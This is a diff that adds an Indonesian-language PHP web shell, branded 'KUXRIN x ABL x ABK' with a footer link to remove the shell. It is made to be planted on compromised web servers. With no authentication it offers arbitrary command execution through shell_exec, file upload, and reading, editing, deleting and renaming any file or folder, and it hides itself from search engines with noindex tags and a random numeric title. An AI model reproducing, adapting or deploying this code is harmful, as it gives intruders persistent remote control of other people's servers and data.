@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <?php
+        $randomNumber = rand(10000000000, 99999999999);
+        echo "<title>$randomNumber</title>";
+    ?>
+    <meta name="robots" content="noindex,nofollow">
+    <meta name="description" content="OrangBerak">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #1c1c1c;
+            color: #e5e5e5;
+            margin: 0;
+            padding: 10px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        h1 {
+            color: #FF6347;
+            font-size: 32px;
+            margin-bottom: 10px;
+        }
+
+        .dir {
+            text-align: center;
+            font-size: 18px;
+            margin-bottom: 10px;
+        }
+
+        .dir a {
+            color: #00BFFF;
+            text-decoration: none;
+            margin-right: 5px;
+        }
+
+        .dir a:hover {
+            color: #FF6347;
+        }
+
+        .form-container {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-bottom: 20px;
+            width: 100%;
+        }
+
+        .small-form {
+            width: 100%;
+            max-width: 30%;
+            text-align: left;
+        }
+
+        table {
+            width: 100%;
+            max-width: 800px;
+            border-collapse: collapse;
+            background-color: #2c2c2c;
+        }
+
+        th, td {
+            padding: 8px;
+            text-align: left;
+            border-bottom: 1px solid #444;
+        }
+
+        th {
+            background-color: #1c1c1c;
+            color: #FF6347;
+        }
+
+        td a {
+            color: #00BFFF;
+            text-decoration: none;
+            margin-right: 5px;
+        }
+
+        td a:hover {
+            color: #FF6347;
+        }
+
+        .btn {
+            padding: 5px 10px;
+            background-color: #00BFFF;
+            color: #1c1c1c;
+            border: none;
+            border-radius: 3px;
+            font-size: 12px;
+            cursor: pointer;
+            margin: 2px;
+            transition: background-color 0.3s ease;
+        }
+
+        .btn:hover {
+            background-color: #FF6347;
+            color: #fff;
+        }
+
+        input[type="file"], input[type="submit"], input[type="text"], textarea {
+            width: 100%;
+            padding: 8px;
+            margin: 5px 0;
+            background-color: #2c2c2c;
+            color: #e5e5e5;
+            border: 1px solid #444;
+            border-radius: 3px;
+        }
+
+        textarea {
+            height: 100px;
+        }
+    </style>
+</head>
+<body>
+
+    <h1>KUXRIN x ABL x ABK</h1>
+    
+    <div class="dir">
+        <b>- <a href="/">Home</a> -</b>
+        <?php
+            if (isset($_GET['dir'])) {
+                $dir = $_GET['dir'];
+            } else {
+                $dir = getcwd();
+            }
+
+            $dir = str_replace("\\", "/", $dir);
+            $dirs = explode("/", $dir);
+
+            foreach ($dirs as $key => $value) {
+                if ($value == "" && $key == 0) {
+                    echo '<a href="/">/</a>';
+                    continue;
+                }
+                echo '<a href="?dir=';
+                for ($i=0; $i <= $key ; $i++) { 
+                    echo "$dirs[$i]"; 
+                    if ($key !== $i) echo "/";
+                } 
+                echo '">'.$value.'</a>/';
+            }
+        ?>
+    </div>
+
+    <div class="form-container">
+        <form enctype="multipart/form-data" method="post" class="small-form">
+            <input type="file" name="upfiles[]" multiple>
+            <input type="submit" name="up" value="Upload!">
+        </form>
+
+        <form method="post" class="small-form">
+            <input type="text" name="new_folder" placeholder="Nama Folder Baru">
+            <input type="submit" name="create_folder" value="Buat Folder" class="btn">
+        </form>
+
+        <form method="post" class="small-form">
+            <input type="text" name="new_file" placeholder="Nama File Baru">
+            <textarea name="file_content" placeholder="Isi file..."></textarea>
+            <input type="submit" name="create_file" value="Buat File" class="btn">
+        </form>
+
+        <form method="post" class="small-form">
+            <input type="text" name="cmd" placeholder="Enter command here">
+            <input type="submit" name="exec_cmd" value="Execute Command" class="btn">
+        </form>
+    </div>
+
+    <?php
+        // Handle file uploads
+        if(isset($_POST['up'])){
+            $files = $_FILES['upfiles'];
+            for($i = 0; $i < count($files['name']); $i++){
+                $uploadfile = $files['name'][$i];
+                if(move_uploaded_file($files['tmp_name'][$i], $dir.'/'.$uploadfile)){
+                    echo "<br>File $uploadfile was successfully uploaded!";
+                } else {
+                    echo "<br>Upload of $uploadfile failed!";
+                }
+            }
+        }
+
+        // Handle folder creation
+        if (isset($_POST['create_folder']) && !empty($_POST['new_folder'])) {
+            $newFolder = $dir . '/' . $_POST['new_folder'];
+            if (mkdir($newFolder, 0777, true)) {
+                echo "<br>Folder '{$_POST['new_folder']}' berhasil dibuat!";
+            } else {
+                echo "<br>Gagal membuat folder '{$_POST['new_folder']}'.";
+            }
+        }
+
+        // Handle file creation
+        if (isset($_POST['create_file']) && !empty($_POST['new_file'])) {
+            $newFile = $dir . '/' . $_POST['new_file'];
+            $content = $_POST['file_content'];
+            if (file_put_contents($newFile, $content)) {
+                echo "<br>File '{$_POST['new_file']}' berhasil dibuat!";
+            } else {
+                echo "<br>Gagal membuat file '{$_POST['new_file']}'.";
+            }
+        }
+
+        // Handle command execution
+        if (isset($_POST['exec_cmd']) && !empty($_POST['cmd'])) {
+            echo "<h3>Command Output:</h3><pre>";
+            $output = shell_exec($_POST['cmd']);
+            echo htmlspecialchars($output);
+            echo "</pre>";
+        }
+
+        // Handle delete folder
+        if (isset($_GET['delete_folder'])) {
+            $folderToDelete = $_GET['delete_folder'];
+            if (is_dir($folderToDelete)) {
+                rmdir($folderToDelete);
+                echo "<script>alert('Folder deleted successfully');window.location='?dir=".$dir."';</script>";
+            }
+        }
+    ?>
+
+    <table>
+        <tr>
+            <th>Nama File / Folder</th>
+            <th>Size</th>
+            <th>Action</th>
+        </tr>
+        <?php
+            $scan = scandir($dir);
+            foreach ($scan as $directory) {
+                if (is_dir($dir.'/'.$directory) && $directory != '.' && $directory != '..') {
+                    echo '
+                    <tr>
+                        <td><a href="?dir='.$dir.'/'.$directory.'">'.$directory.'</a></td>
+                        <td><center>--</center></td>
+                        <td>
+                            <a href="?dir='.$dir.'&delete_folder='.$dir.'/'.$directory.'" class="btn">Delete</a>
+                        </td>
+                    </tr>';
+                } 
+            }
+
+            foreach ($scan as $file) {
+                if (is_file($dir.'/'.$file)) {
+                    $size = filesize($dir.'/'.$file) / 1024;
+                    $size = round($size, 3);
+                    $size = ($size >= 1024) ? round($size / 1024, 2) . 'MB' : $size . 'KB';
+
+                    echo '
+                    <tr>
+                        <td><a href="?dir='.$dir.'&open='.$dir.'/'.$file.'">'.$file.'</a></td>
+                        <td>'.$size.'</td>
+                        <td>
+                            <a href="?dir='.$dir.'&ubah='.$dir.'/'.$file.'" class="btn">Edit</a>
+                            <a href="?dir='.$dir.'&delete='.$dir.'/'.$file.'" class="btn">Delete</a>
+                            <a href="?dir='.$dir.'/'.$file.'&wibu=rename" class="btn">Rename</a>
+                        </td>
+                    </tr>';
+                }
+            }
+
+            if (isset($_GET['open'])) {
+                echo '<textarea>'.htmlspecialchars(file_get_contents($_GET['open'])).'</textarea>';
+            }
+
+            if (isset($_GET['delete'])) {
+                if (unlink($_GET['delete'])) {
+                    echo "<script>alert('File deleted successfully');window.location='?dir=".$dir."';</script>";
+                }
+            }
+
+            if (isset($_GET['ubah'])) {
+                echo "<form method='post'>
+                    <input type='hidden' name='object' value='".$_GET['ubah']."'>
+                    <textarea name='edit'>".htmlspecialchars(file_get_contents($_GET['ubah']))."</textarea>
+                    <input type='submit' name='dir_rename' value='Save Edit!' class='btn'>
+                </form>";
+            }
+
+            if (isset($_POST['edit'])) {
+                $data = fopen($_POST["object"], 'w');
+                if (fwrite($data, $_POST['edit'])) {
+                    echo "<center>Edit File: Successful!</center>";
+                } else {
+                    echo "<script>alert('Edit File: Unsuccessful!');</script>";
+                }
+            }
+
+            if (isset($_GET['wibu']) && $_GET['wibu'] == 'rename') {
+                echo "<form method='post'>
+                    Rename: 
+                    <input type='text' value='".basename($dir)."' name='fol_rename'>
+                    <input type='submit' name='dir_rename' value='Rename!' class='btn'>
+                </form>";
+                if (isset($_POST['dir_rename'])) {
+                    $dir_rename = rename($dir, "".dirname($dir)."/".htmlspecialchars($_POST['fol_rename'])."");
+                    if($dir_rename) {
+                        echo "<br>Rename File: Successful!";
+                    } else {
+                        echo "<br>Rename File: Unsuccessful!";
+                    }
+                }
+            }
+        ?>
+    </table>
+
+    <footer>
+        MZ 0BY G4NTHENK <a href="?die">(Hapus Shell)</a>
+    </footer>
+</body>
+</html>
